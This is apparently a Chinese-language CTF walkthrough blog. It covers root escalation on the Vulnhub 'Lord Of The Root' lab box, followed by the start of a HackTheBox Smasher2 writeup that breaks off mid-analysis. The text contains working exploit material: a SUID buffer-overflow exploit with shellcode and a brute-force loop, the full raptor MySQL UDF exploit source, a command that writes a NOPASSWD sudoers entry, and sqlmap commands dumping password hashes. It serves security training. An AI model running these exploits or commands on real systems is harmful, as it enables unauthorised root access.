#### 提权2:利用SUID利用root拥有的二进制文件来获得root

导航到root目录，看到一个名为“SECRET”的目录。在此目录中，有3个“doors”，每个都有一个名为“file”的文件：

``` bash
smeagol@LordOfTheRoot:/$ cd SECRET
cd SECRET
smeagol@LordOfTheRoot:/SECRET$ ls
ls
door1  door2  door3
smeagol@LordOfTheRoot:/SECRET$ ls -lahR
ls -lahR
.:
total 20K
drwxr-xr-x  5 root root 4.0K Sep 22  2015 .
drwxr-xr-x 23 root root 4.0K Sep 22  2015 ..
drwxr-xr-x  2 root root 4.0K Jan 25 19:15 door1
drwxr-xr-x  2 root root 4.0K Jan 25 19:15 door2
drwxr-xr-x  2 root root 4.0K Jan 25 19:15 door3

./door1:
total 16K
drwxr-xr-x 2 root root 4.0K Jan 25 19:15 .
drwxr-xr-x 5 root root 4.0K Sep 22  2015 ..
-rwsr-xr-x 1 root root 7.2K Sep 17  2015 file

./door2:
total 16K
drwxr-xr-x 2 root root 4.0K Jan 25 19:15 .
drwxr-xr-x 5 root root 4.0K Sep 22  2015 ..
-rwsr-xr-x 1 root root 7.2K Sep 17  2015 file

./door3:
total 16K
drwxr-xr-x 2 root root 4.0K Jan 25 19:15 .
drwxr-xr-x 5 root root 4.0K Sep 22  2015 ..
-rwsr-xr-x 1 root root 5.1K Sep 22  2015 file
```

看到这些文件具有SUID并由Root拥有！如果可以利用这一点，那可能就是升级root的门票。检查每个文件，看到它们都是二进制可执行文件。但是,3个中的1个具有不同的sha1哈希：

``` bash
smeagol@LordOfTheRoot:/SECRET$ file door1/file door2/file door3/file
file door1/file door2/file door3/file
door1/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped
door2/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=9e50c7cacaf5cc2c78214c81f110c88e61ad0c10, not stripped
door3/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped
```

根据以前的经验，最好使用与其他2不同的二进制文件。此外，注意到在设置了一定时间后，二进制文件被切换到了新的door。为了解决这个问题，将文件复制到smeagol的桌面上以进行更一致的测试：

``` bash
smeagol@LordOfTheRoot:/SECRET$ cp door2/file /home/smeagol/Desktop/
cp door2/file /home/smeagol/Desktop/
smeagol@LordOfTheRoot:/SECRET$ ls /home/smeagol/Desktop/
ls /home/smeagol/Desktop/
file
```

运行此文件，看到它要求用户输入字符串：

``` bash
smeagol@LordOfTheRoot:~/Desktop$ ./file
./file
Syntax: ./file <input string>
smeagol@LordOfTheRoot:~/Desktop$ ./file A
./file A
```

看到这是vulnhub上的映像，可以假定该文件容易受到缓冲区溢出的影响。使用python来模糊文件并确认：

``` bash
smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c 'print "A" * 100')
./file $(python -c 'print "A" * 100')
smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c 'print "A" * 200')
./file $(python -c 'print "A" * 200')
Segmentation fault (core dumped)
smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c 'print "A" * 150')
./file $(python -c 'print "A" * 150')
smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c 'print "A" * 175')
./file $(python -c 'print "A" * 175')
Segmentation fault (core dumped)
smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c 'print "A" * 160')
./file $(python -c 'print "A" * 160')
```

注意到当文件接收大约175个字符时存在分段错误。
为了获得更准确的计数，使用metasploit中的内置ruby脚本来创建175个字符的模式字符串：

``` bash
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 175
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A
```

采用以下字符串并通过GDB运行它，然后运行字符串：

``` bash
smeagol@LordOfTheRoot:~/Desktop$ gdb -q ./file
gdb -q ./file
Reading symbols from ./file...(no debugging symbols found)...done.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A
<8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A                
Starting program: /home/smeagol/Desktop/file Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A

Program received signal SIGSEGV, Segmentation fault.
0x41376641 in ?? ()
```

如预期的那样，在0x41376641收到段错误。可以将此数字带回metasploit脚本，以查看它是多少个字符：

``` bash
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641
[*] Exact match at offset 171
```

现在知道二进制文件将在第171个字符串处进行段错误处理，然后可以更新fuzz进行确认。通过GDB，添加171个字符A，4个字符B和其余的C。

``` bash
smeagol@LordOfTheRoot:~/Desktop$ gdb -q ./file
gdb -q ./file
Reading symbols from ./file...(no debugging symbols found)...done.
(gdb) run $(python -c 'print "A" * 171 + "B" * 4 + "C" * 50')
run $(python -c 'print "A" * 171 + "B" * 4 + "C" * 50')
Starting program: /home/smeagol/Desktop/file $(python -c 'print "A" * 171 + "B" * 4 + "C" * 50')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info r
info r
eax            0x0      0
ecx            0xbffffdd0       -1073742384
edx            0xbffffb54       -1073743020
ebx            0xb7fc0000       -1208221696
esp            0xbffffb30       0xbffffb30
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x42424242       0x42424242
eflags         0x10202  [ IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

如上所示，检查了寄存器，发现EIP现在已被0x42424242覆盖，该十六进制转换为BBBB。现在可以控制EIP！进一步的枚举告诉我还启用了ASLR：

``` bash
smeagol@LordOfTheRoot:~/Desktop$ cat /proc/sys/kernel/randomize_va_space
cat /proc/sys/kernel/randomize_va_space
2
```

看到启用了ASLR，这将使的地址空间随机化。此外，程序中没有可使用的JMP ESP指令。使无法指定特定的EIP地址来指向shellcode。

但是，我的想法是，如果可以循环利用漏洞，也许可以“猜测”甚至更好，用EIP地址获得“lucky”，从而击中了shellcode。为此，需要在漏洞利用程序中添加一个较大的NOPsled，以便如果EIP确实被正确击中，则NOPsled将允许程序滑至我的shellcode。

再次运行payload，这次使用了2000个较大的Nopsled：

``` bash
smeagol@LordOfTheRoot:~/Desktop$ gdb -q ./file
gdb -q ./file
Reading symbols from ./file...(no debugging symbols found)...done.
(gdb) run $(python -c 'print "A" * 171 + "B" * 4 + "\x90" * 2000')
run $(python -c 'print "A" * 171 + "B" * 4 + "\x90" * 2000')
Starting program: /home/smeagol/Desktop/file $(python -c 'print "A" * 171 + "B" * 4 + "\x90" * 2000')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
x/s $esp
0xbfffee70:     '\220' <repeats 200 times>...
```

因此，仍然可以控制EIP，看来ESP指向的是其他位置，0xbfffee70,将使用它作为EIP的位置。另外，将包括shellcode。生成shell的非常常见的shellcode是：

``` bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
```

在当前的GDB会话中测试payload，以确认漏洞利用程序是否正常工作：

``` bash
(gdb) run $(python -c 'print "A" * 171 + "\x70\xee\xff\xbf" + "\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /tmp/file $(python -c 'print "A" * 171 + "\x70\xee\xff\xbf" + "\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
process 30271 is executing new program: /bin/dash
$ id
uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
$ whoami
smeagol
```

优秀！产生了一个shell。但是，以smeagol的身份运行，而不是以root用户身份运行，因为这只是我复制下来的文件。另外，请务必注意，我的EIP地址位置“\x70\xee\xff\xbf"
由于字节序少，所以反向写入。

现在，我知道我的漏洞利用程序有用，现在是时候将该漏洞循环到真实环境中了。使用以下脚本来完成此任务：

``` bash
for a in {1..1000}; do ./file $(python -c 'print "A" * 171 + "\x70\xee\xff\xbf" + "\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'); done
```

准备好漏洞利用程序后，回到/SECRET/目录并找到适当的文件并执行脚本：

``` bash
smeagol@LordOfTheRoot:/SECRET$ file door1/file door2/file door3/file
door1/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped
door2/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped
door3/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=9e50c7cacaf5cc2c78214c81f110c88e61ad0c10, not stripped
```
运行下面的命令，成功提权如下所示。。。

``` bash
for a in {1..1000}; do /SECRET/door3/file $(python -c 'print "A" * 171 + "\x70\xee\xff\xbf" + "\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'); done
```

``` bash
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
# id
uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)
# whoami
root
```

读取flag

``` bash
# cd /root
# ls                                                                                                                                                                                                                                       
Flag.txt  buf  buf.c  other  other.c  switcher.py                                                                                                                                                                                          
# cat Flag.txt                                                                                                                                                                                                                             
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”                                                                                                                                   
– Gandalf
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub186.jpg)

#### 提权3:mysql-udf提权

使用sqlmap dump出mysql的用户名和密码的hash值，之前的步骤略

``` bash
root@kali:~# sqlmap -u http://192.168.56.113:1337/978345210/index.php --forms --batch -D mysql -T user --dump
root             | <blank> | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |
root             | <blank> | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |
debian-sys-maint | <blank> | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F | 
root             | <blank> | *A55A9B9049F69BC2768C9284615361DFBD580B34 |
root             | <blank> | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |
```

解密出

``` bash
*4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
```

的值是darkshadow
然后用之前的账号和密码先连接ssh

searchsploit搜索mysql udf提权exploit

``` bash
root@kali:~# searchsploit User-Defined Function
---------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------- ----------------------------------------
Microsoft Edge Chakra JIT - Op_MaxInAnArray and Op_MinInAnArray can Explicitly ca | exploits/windows/dos/43466.js
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)            | exploits/linux/local/1181.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)           | exploits/linux/local/1518.c
MySQL 4.x/5.0 (Windows) - User-Defined Function Command Execution                 | exploits/windows/remote/3274.txt
---------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@kali:~# cat /usr/share/exploitdb/exploits/linux/local/1518.c
/*
 * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $
 *
 * raptor_udf2.c - dynamic library for do_system() MySQL UDF
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This is an helper dynamic library for local privilege escalation through
 * MySQL run with root privileges (very bad idea!), slightly modified to work 
 * with newer versions of the open-source database. Tested on MySQL 4.1.14.
 *
 * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
 *
 * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
 * for the security vulnerabilities in the handling of User Defined Functions
 * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further
 * details, please refer to:
 *
 * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
 * http://www.wisec.it/vulns.php?page=4
 * http://www.wisec.it/vulns.php?page=5
 * http://www.wisec.it/vulns.php?page=6
 *
 * "UDFs should have at least one symbol defined in addition to the xxx symbol 
 * that corresponds to the main xxx() function. These auxiliary symbols 
 * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and 
 * xxx_add() functions". -- User Defined Functions Security Precautions 
 *
 * Usage:
 * $ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
 * [...]
 *
 * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
 *
 */

#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
        unsigned int            arg_count;      // number of arguments
        enum Item_result        *arg_type;      // pointer to item_result
        char                    **args;         // pointer to arguments
        unsigned long           *lengths;       // length of string args
        char                    *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
        char                    maybe_null;     // 1 if func can return NULL
        unsigned int            decimals;       // for real functions
        unsigned long           max_length;     // for string functions
        char                    *ptr;           // free ptr for func data
        char                    const_item;     // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
        if (args->arg_count != 1)
                return(0);

        system(args->args[0]);

        return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
        return(0);
}

// milw0rm.com [2006-02-20]
```

将下面的代码命名为raptor_udf2.c

``` bash
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
        unsigned int            arg_count;      // number of arguments
        enum Item_result        *arg_type;      // pointer to item_result
        char                    **args;         // pointer to arguments
        unsigned long           *lengths;       // length of string args
        char                    *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
        char                    maybe_null;     // 1 if func can return NULL
        unsigned int            decimals;       // for real functions
        unsigned long           max_length;     // for string functions
        char                    *ptr;           // free ptr for func data
        char                    const_item;     // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
        if (args->arg_count != 1)
                return(0);

        system(args->args[0]);

        return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
        return(0);
}
```

执行下面命令编译


``` bash
smeagol@LordOfTheRoot:~$ gcc -g -c raptor_udf2.c
smeagol@LordOfTheRoot:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -oraptor_udf2.so raptor_udf2.o -lc
smeagol@LordOfTheRoot:~$ ls
39166.c  Documents  examples.desktop  Music     Public         raptor_udf2.o   Templates
Desktop  Downloads  exp               Pictures  raptor_udf2.c  raptor_udf2.so  Videos
```

最后连接mysql数据库执行下面命令提权


``` bash
smeagol@LordOfTheRoot:~$ mysql -uroot -pdarkshadow
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9781
Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.08 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)

mysql> select do_system('echo "smeagol ALL =(ALL) NOPASSWD: ALL" >> /etc/sudoers');
+----------------------------------------------------------------------+
| do_system('echo "smeagol ALL =(ALL) NOPASSWD: ALL" >> /etc/sudoers') |
+----------------------------------------------------------------------+
|                                                                    0 |
+----------------------------------------------------------------------+
1 row in set (0.02 sec)

mysql> quit
Bye
smeagol@LordOfTheRoot:~$ sudo bash
root@LordOfTheRoot:~# id
uid=0(root) gid=0(root) groups=0(root)
root@LordOfTheRoot:~# whoami
root
root@LordOfTheRoot:~# cd /root
root@LordOfTheRoot:/root# ls
buf  buf.c  Flag.txt  other  other.c  switcher.py
root@LordOfTheRoot:/root# cat Flag.txt 
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
root@LordOfTheRoot:/root#
```

可以看到，成功的提权了

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub187.jpg)


#### 知识点总结

 - 端口碰撞
 - sql注入时间盲注
 - “overlayfs”本地权限提升
 - 利用SUID利用root拥有的二进制文件提权
 - gdb调试得到python shellcode的poc
 - mysql-udf提权

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end Lord-Of-The-Root-1-0-1 -->

</details>

<a id="case-smasher2"></a>

## 引用计数与内核映射

应用的原生模块引用计数影响对象生命周期，本地 dhid 接口继续分析 mmap 边界。替代登录路径、堆布局和内核代码按原实验保留。

<p class="kb-provenance">来源 Smasher2 · 原记录 2019-12-26 · 66 个代码块 · 18 处图片引用</p>

<details class="kb-evidence" id="record-smasher2">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Smasher2 -->

#### 介绍

<font color="red">注意：本博客每一篇博客仅作记录供本人日后查阅。</font>

难度：疯狂
点数：50
发布日期：2019年6月01日
IP:10.10.10.135

user.txt和root.txt的一血分别用了07小时13分55秒，20小时29分49秒，真够疯狂的。
 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1.jpg)
 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### 开始之前

注册hack the box需要邀请码，无非就是找到注册api然后解密两次，很简单,参考网址[Hack The Box: How to get invite code](https://codeburst.io/hack-the-box-how-to-get-invite-code-56e369fc8dae)根据教程一步一步走就能获得注册码了，英文不好的小朋友自行谷歌翻译。

#### 准备入坑[Hack The Box]

htb的每一个靶场需要vpn连接才能使用，按照下图根据说明下载.ovpn文件，然后下载openvpn连接客户端，社区免费版下载网址[Openvpn Community Downloads](https://openvpn.net/community-downloads/),下载安装完成后导入.ovpn文件点击连接即可打开靶机的网址。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2.jpg)

#### 信息收集

老规矩上nmap

``` bash
root@kali:~# nmap -p- --min-rate 10000 10.10.10.135 -v -sV (快速扫描所有开放的tcp端口)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

root@kali:~# nmap -p 22,53,80 -sC -sV -A -v 10.10.10.135 (扫描端口开放的服务)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:fc:20:4e:5a (RSA)
|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)
|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)
53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden

root@kali:~# nmap -sU -p- --min-rate 10000 -v 10.10.10.135 (快速扫描开放的udp端口)
PORT   STATE SERVICE
53/udp open  domain
```

dirb爆破一波

``` bash
root@kali:~# dirb http://10.10.10.135/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Dec 26 20:55:10 2019
URL_BASE: http://10.10.10.135/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.135/ ----
+ http://10.10.10.135/.config (CODE:403|SIZE:294)                                                 
+ http://10.10.10.135/_vti_bin/_vti_adm/admin.dll (CODE:403|SIZE:314)                             
+ http://10.10.10.135/_vti_bin/_vti_aut/author.dll (CODE:403|SIZE:315)                            
+ http://10.10.10.135/_vti_bin/shtml.dll (CODE:403|SIZE:305)                                      
+ http://10.10.10.135/akeeba.backend.log (CODE:403|SIZE:305)                                      
+ http://10.10.10.135/awstats.conf (CODE:403|SIZE:299)                                            
==> DIRECTORY: http://10.10.10.135/backup/                                                        
+ http://10.10.10.135/development.log (CODE:403|SIZE:302)                                         
+ http://10.10.10.135/global.asa (CODE:403|SIZE:297)                                              
+ http://10.10.10.135/global.asax (CODE:403|SIZE:298)                                                            
+ http://10.10.10.135/index.html (CODE:200|SIZE:10918)                                                           
+ http://10.10.10.135/main.mdb (CODE:403|SIZE:295)                                                               
+ http://10.10.10.135/php.ini (CODE:403|SIZE:294)                                                 
+ http://10.10.10.135/production.log (CODE:403|SIZE:301)                                          
+ http://10.10.10.135/readfile (CODE:403|SIZE:414)                                                
+ http://10.10.10.135/server-status (CODE:403|SIZE:300)                                           
+ http://10.10.10.135/spamlog.log (CODE:403|SIZE:298)                                             
+ http://10.10.10.135/thumbs.db (CODE:403|SIZE:296)                                               
+ http://10.10.10.135/Thumbs.db (CODE:403|SIZE:296)                                               
+ http://10.10.10.135/WS_FTP.LOG (CODE:403|SIZE:297) 
```

发现backup目录,这个把靶场刚发布时，/backup受.htpassword保护，该密码作为基本身份验证的弹出窗口显示，需要用hydra爆破用户名和密码，使用kali中的rockyou.txt字典。 但是现在此内容已从box中移除，因此，如果现在访问/backup，则会直接将您带进去。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb3.jpg)

下载这两个文件。

由于53的tcp/udp端口都开放了，TCP上的DNS通常仅对区域传输开放。 这是要尝试的第一件事。 猜想域名是smasher.htb和smasher2.htb。 返回有趣的结果：

``` bash
root@kali:~# dig axfr @10.10.10.135 smasher2.htb

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.135 smasher2.htb
; (1 server found)
;; global options: +cmd
smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
smasher2.htb.           604800  IN      NS      smasher2.htb.
smasher2.htb.           604800  IN      A       127.0.0.1
smasher2.htb.           604800  IN      AAAA    ::1
smasher2.htb.           604800  IN      PTR     wonderfulsessionmanager.smasher2.htb.
smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
;; Query time: 265 msec
;; SERVER: 10.10.10.135#53(10.10.10.135)
;; WHEN: 四 12月 26 21:25:05 EST 2019
;; XFR size: 6 records (messages 1, bytes 242)
```

将下面ip地址和3个域名添加到hosts文件中

``` bash
10.10.10.135 wonderfulsessionmanager.smasher2.htb smasher2.htb root.smasher2.htb
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb4.jpg)

访问http://root.smasher2.htb/backup/发现还是原来的页面如下图所示

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb5.jpg)

访问http://wonderfulsessionmanager.smasher2.htb/如下

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb6.jpg)

点击try login登录

 - 查看之前下载的python文件的源码

从/backup提取的两个文件构成了Python Flask Web应用程序。 主要代码是auth.py。 第二行是import ses，像其他Python模块一样加载.so共享库。

ses库用于在应用程序启动时创建具有登录凭据的对象。 不幸的是，用户名和密码已从以下备用代码中删除：

``` bash
def safe_init_manager(id):
    lock.acquire()
    if id in Managers:
        del Managers[id]
    else:
            login = ["<REDACTED>", "<REDACTED>"]
            Managers.update({id: ses.SessionManager(login, craft_secure_token(":".join(login)))})
    lock.release()
```

Flask应用程序具有以@app.before_request修饰的before_request函数，因此它将在将每个请求传递给路由处理代码之前与每个请求一起运行：

``` bash
@app.before_request
def before_request():
    if request.path == "/":
        if not session.has_key("id"):
            k = get_secure_key()
            safe_init_manager(k)
            session["id"] = k
        elif session.has_key("id") and not safe_have_manager(session["id"]):
            del session["id"]
            return redirect("/", 302)
    else:
        if session.has_key("id") and safe_have_manager(session["id"]):
            pass
        else:
            return redirect("/", 302)
```
此代码确保为每次访问创建一个会话，或者将其重定向到/。
该应用程序有五个路径，/assets/<path:filename>, /, /login, /auth, /api。 最后两个最有趣。


####  Shell as dzonerzy

 - 获取API密钥

尝试登录该页面时，有一个POST到/auth。 看一下这段代码，就会发现以下内容：

``` bash
@app.route('/auth', methods=['POST'])
def login():
    ret = {"authenticated": None, "result": None}
    manager = safe_get_manager(session["id"])
    data = request.get_json(silent=True)
    if data:
        try:
            tmp_login = dict(data["data"])
        except:
            pass
        tmp_user_login = None
        try:
            is_logged = manager.check_login(data)
            secret_token_info = ["/api/<api_key>/job", manager.secret_key, int(time.time())]
            try:
                tmp_user_login = {"username": tmp_login["username"], "password": tmp_login["password"]}
            except:
                pass
            if not is_logged[0]:
                ret["authenticated"] = False
                ret["result"] = "Cannot authenticate with data: %s - %s" % (is_logged[1], "Too many tentatives, wait 2 minutes!" if manager.blocked else "Try again!")
            else:
                if tmp_user_login is not None:
                    log_creds(request.remote_addr, tmp_user_login)
                ret["authenticated"] = True
                ret["result"] = {"endpoint": secret_token_info[0], "key": secret_token_info[1], "creation_date": secret_token_info[2]}
        except TypeError as e:
            ret["authenticated"] = False
            ret["result"] = str(e)
    else:
        ret["authenticated"] = False
        ret["result"] = "Cannot authenticate missing parameters."
    return jsonify(ret)
